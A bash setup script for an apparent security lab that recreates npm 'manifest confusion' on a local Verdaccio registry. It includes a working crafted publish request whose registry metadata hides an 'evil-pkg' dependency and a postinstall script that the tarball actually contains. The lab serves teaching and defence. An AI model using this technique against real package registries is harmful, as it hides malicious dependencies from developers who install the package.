#!/bin/bash
# Build packages and publish to local Verdaccio registry.
# The crafted-widget package is published with MISMATCHED manifests:
#   - The tarball contains: dependencies including "evil-pkg" + postinstall script
#   - The registry metadata is crafted to hide "evil-pkg" and the postinstall script
#
# This simulates the manifest confusion vulnerability discovered by
# Darcy Clarke in 2023 (https://blog.vlt.sh/blog/the-massive-hole-in-the-npm-ecosystem)
#
# The real vulnerability: npm's publish API accepts metadata separately from the
# tarball, and the registry did not validate that they match.

set -euo pipefail

REGISTRY="http://registry:4873"
PACKAGES_DIR="/lab/src/packages"

echo "=== Waiting for Verdaccio registry ==="
until curl -sf "${REGISTRY}/-/ping" > /dev/null 2>&1; do
    sleep 1
done
echo "[+] Registry is up"

# Create an auth token for publishing
echo "=== Authenticating with registry ==="
TOKEN=$(curl -sf -X PUT "${REGISTRY}/-/user/org.couchdb.user:labuser" \
    -H "Content-Type: application/json" \
    -d '{"name":"labuser","password":"labpass123"}' | node -pe "JSON.parse(require('fs').readFileSync('/dev/stdin','utf8')).token")

echo "//registry:4873/:_authToken=${TOKEN}" > ~/.npmrc
echo "registry=${REGISTRY}/" >> ~/.npmrc
echo "[+] Authenticated"

# --- Step 1: Publish lodash stub (dependency of safe-utils and crafted-widget) ---
echo ""
echo "=== Publishing lodash@4.17.21 (stub) ==="
WORK=$(mktemp -d)
cd "${WORK}"
mkdir lodash && cd lodash
cat > package.json << 'LJSON'
{
  "name": "lodash",
  "version": "4.17.21",
  "description": "Lodash stub for lab",
  "main": "index.js"
}
LJSON
cat > index.js << 'LJS'
module.exports = { capitalize: (s) => s.charAt(0).toUpperCase() + s.slice(1), isEmpty: (v) => !v || (typeof v === 'object' && Object.keys(v).length === 0) };
LJS
npm publish --registry "${REGISTRY}" 2>&1 || true
echo "[+] lodash stub published"

# --- Step 2: Publish evil-pkg (the hidden malicious dependency) ---
echo ""
echo "=== Publishing evil-pkg ==="
cd "${PACKAGES_DIR}/evil-pkg"
npm publish --registry "${REGISTRY}" 2>&1 || true
echo "[+] evil-pkg published"

# --- Step 3: Publish safe-utils (a normal package for comparison) ---
echo ""
echo "=== Publishing safe-utils ==="
cd "${PACKAGES_DIR}/safe-utils"
npm publish --registry "${REGISTRY}" 2>&1 || true
echo "[+] safe-utils published"

# --- Step 4: Publish crafted-widget with MISMATCHED manifest ---
# This is the key attack: we craft the npm publish API request manually.
# The tarball contains the REAL package.json (with evil-pkg + postinstall).
# The metadata sent to the registry API hides evil-pkg and the postinstall script.
echo ""
echo "=== Publishing crafted-widget with manifest confusion ==="
cd "${PACKAGES_DIR}/crafted-widget"

# Create the tarball with the REAL (malicious) package.json
npm pack 2>&1
TARBALL=$(ls crafted-widget-*.tgz)
echo "[+] Tarball created: ${TARBALL}"

echo ""
echo "--- What's ACTUALLY in the tarball ---"
tar xzf "${TARBALL}" -O package/package.json
echo ""

# Craft the publish request with FAKE (clean) metadata
# This is exactly how the real vulnerability worked: the PUT /{package} endpoint
# accepts metadata in the JSON body that doesn't have to match the tarball.
node -e "
const fs = require('fs');
const crypto = require('crypto');

const tarball = fs.readFileSync('${TARBALL}');
const tarballBase64 = tarball.toString('base64');
const shasum = crypto.createHash('sha1').update(tarball).digest('hex');
const integrity = 'sha512-' + crypto.createHash('sha512').update(tarball).digest('base64');

// This is the FAKE metadata — what the registry will show via API
// Note: dependencies do NOT include evil-pkg, and scripts has no postinstall
const fakeManifest = {
    name: 'crafted-widget',
    version: '2.1.0',
    description: 'A helpful widget library',
    main: 'index.js',
    dependencies: {
        'lodash': '^4.17.21'
        // evil-pkg is HIDDEN here
    },
    // No postinstall script shown
    scripts: {}
};

// Construct the npm publish payload
const payload = {
    _id: 'crafted-widget',
    name: 'crafted-widget',
    description: 'A helpful widget library',
    'dist-tags': { latest: '2.1.0' },
    versions: {
        '2.1.0': {
            ...fakeManifest,
            _id: 'crafted-widget@2.1.0',
            _nodeVersion: process.version.slice(1),
            _npmVersion: '10.0.0',
            dist: {
                shasum: shasum,
                integrity: integrity,
                tarball: '${REGISTRY}/crafted-widget/-/crafted-widget-2.1.0.tgz'
            }
        }
    },
    _attachments: {
        'crafted-widget-2.1.0.tgz': {
            content_type: 'application/octet-stream',
            data: tarballBase64,
            length: tarball.length
        }
    }
};

// Send the crafted publish request
const http = require('http');
const data = JSON.stringify(payload);

const req = http.request({
    hostname: 'registry',
    port: 4873,
    path: '/crafted-widget',
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        'Authorization': 'Bearer ${TOKEN}'
    }
}, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
        if (res.statusCode === 200 || res.statusCode === 201) {
            console.log('[+] crafted-widget published with MISMATCHED manifest');
        } else {
            console.log('[-] Publish failed:', res.statusCode, body);
        }
    });
});

req.write(data);
req.end();
"

sleep 2

# --- Verification ---
echo ""
echo "=== Verification ==="
echo ""
echo "What the registry API shows (npm view):"
curl -sf "${REGISTRY}/crafted-widget" | node -pe "
const pkg = JSON.parse(require('fs').readFileSync('/dev/stdin','utf8'));
const latest = pkg.versions[pkg['dist-tags'].latest];
console.log('  Name:', latest.name);
console.log('  Version:', latest.version);
console.log('  Dependencies:', JSON.stringify(latest.dependencies));
console.log('  Scripts:', JSON.stringify(latest.scripts || {}));
'---'
" || echo "[-] Could not verify registry metadata"
echo ""
echo "[!] The registry shows: dependencies = {lodash: ^4.17.21} (NO evil-pkg)"
echo "[!] The tarball contains: dependencies = {lodash: ^4.17.21, evil-pkg: *}"
echo "[!] That is the manifest confusion."
echo ""
echo "=== Setup complete ==="
